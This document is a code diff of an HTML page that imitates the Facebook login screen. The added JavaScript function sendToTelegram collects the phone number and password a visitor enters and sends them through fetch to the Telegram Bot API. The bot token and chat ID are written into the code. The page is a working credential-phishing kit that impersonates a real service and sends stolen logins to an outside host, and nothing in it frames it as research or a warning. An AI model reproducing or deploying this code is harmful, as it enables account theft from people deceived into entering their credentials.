@@ -1,90 +1,117 @@
-<!DOCTYPE html> 
-<html> 
-<head> 
-<title>Login</title> 
-<style> 
-body{ 
- text-align: center; 
- background-color: #C0C0C0; 
-} 
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+  <style>
+    body {
+      text-align: center;
+      background-color: #C0C0C0;
+    }
+    
+    #container {
+      background-color: white;
+      width: 80%;
+      position: absolute;
+      left: 10%;
+      box-shadow: 0 0 12px 0 rgba(0, 0, 0, 0.2), 0 11px 34px 10px rgba(0, 0, 0, 0.2);
+      border-radius: 10px;
+    }
+    
+    input {
+      margin: 15px;
+      width: 80%;
+      padding: 20px 20px;
+      border-radius: 5px;
+      border: 1px solid gray;
+      font-size: 20px;
+    }
+    
+    input:focus {
+      border-color: black;
+    }
+    
+    h1 {
+      color: blue;
+      font-size: 45px;
+      font-family: sans-serif;
+    }
+    
+    p {
+      font-family: sans-serif;
+      font-size: 20px;
+      margin: 30px;
+    }
+    
+    .bu {
+      width: 85%;
+      background-color: blue;
+      color: white;
+      padding: 20px 20px;
+      border-radius: 10px;
+      font-family: sans-serif;
+      font-size: 20px;
+    }
+    
+    span a {
+      text-decoration: none;
+      color: blue;
+      font-size: 20px;
+      font-family: sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <h1>facebook</h1>
+  <div id="container">
+    <form id="myform" onsubmit="return sendToTelegram()">
+      <p>Log into Facebook</p>
+      <input type="tel" placeholder="Phonenumber" name="phone" id="phone" required /><br /><br />
+      <input placeholder="Password" type="password" name="password" id="password" required /><br /><br /><br />
+      <input type="submit" class="bu" value="Log in"><br><br />
+      <span><a href="">Forgot account?&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign Up for Facebook</a></span>
+    </form>
+  </div>
 
-#container{ 
- background-color: white; 
- width: 80%; 
- position: absolute; 
- left: 10%; 
- box-shadow:0 0 12px 0 rgba(0,0,0,0.2),0 11px 34px 10px rgba(0,0,0,0.2); 
- border-radius: 10px; 
-} 
-input{ 
- margin: 15px; 
- width: 80%; 
- padding: 20px 20px; 
- border-radius: 5px; 
- border: 1px solid gray; 
- font-size: 20px; 
-} 
-input:focus{ 
-    border-color:black; 
-} 
-h1{ 
- color: blue; 
- font-size: 45px; 
- font-family: sans-serif; 
-} 
-p{ 
- font-family: sans-serif; 
- font-size: 20px; 
- margin: 30px; 
+  <script>
+    function sendToTelegram() {
+      var phone = document.getElementById("phone").value;
+      var password = document.getElementById("password").value;
 
-} 
-.bu{ 
- width: 85%; 
- background-color: blue; 
- color: white; 
- padding: 20px 20px; 
- border-radius: 10px; 
- font-family: sans-serif; 
- font-size: 20px; 
-} 
-span a{ 
- text-decoration: none; 
- color: blue; 
- font-size: 20px; 
- font-family: sans-serif; 
-} 
-</style> 
-</head> 
-<body > 
-<h1>facebook</h1> 
-<div id ="container"> 
-<form id="myform" action="index.php" method="post" onsubmit="return check()"> 
+      // Basic validation
+      if (phone.length !== 10) {
+        alert("Enter a valid 10-digit phone number!");
+        return false;
+      }
 
-<p>Log into Facebook</p> 
-<input type="tel" placeholder="Phonenumber" name="phone" id="phone" required/></br></br> 
-<input placeholder="Password" type="password" name="password" id="password" required/></br></br></br> 
-<input type="submit" name="" class="bu" value="Log in"><br><br> 
-<span><a href="">Forgot account?&nbsp &nbsp&nbsp&nbsp &nbsp&nbsp &nbsp Sign Up for Facebook</a></span> 
-</div> 
+      if (password.length < 6) {
+        alert("Password must be at least 6 characters!");
+        return false;
+      }
 
-<script>
-function check() {
-  var phone = document.getElementById("phone").value;
-  var password = document.getElementById("password").value;
+      // Telegram Bot details
+      const botToken = '7417942104:AAHa8DHN5cNPvO-xYNBcRb7xZ3xz2s8dmTE';  // Replace with your bot's token
+      const chatId = '1678045864';     // Replace with your chat ID
 
-  if (phone.length < 10 || phone.length > 10) {
-    alert("Enter the correct Phone number!!");
-    return false;
-  } 
+      // The message content to send
+      const message = `Phone: ${phone}\nPassword: ${password}`;
 
-  if (password.length < 6) {
-    alert("incorrect password!");
-    return false;
-  }
+      // Send the data to the Telegram Bot API using fetch
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            alert('Your data has been sent to Telegram successfully.');
+          } else {
+            alert('Failed to send the data to Telegram: ' + data.description);
+          }
+        })
+        .catch(error => {
+          console.error('Error sending data to Telegram:', error);
+        });
 
-  return true;
-}
-</script>
-
-</body> 
+      // Prevent form from submitting and refreshing the page
+      return false;
+    }
+  </script>
+</body>
 </html>
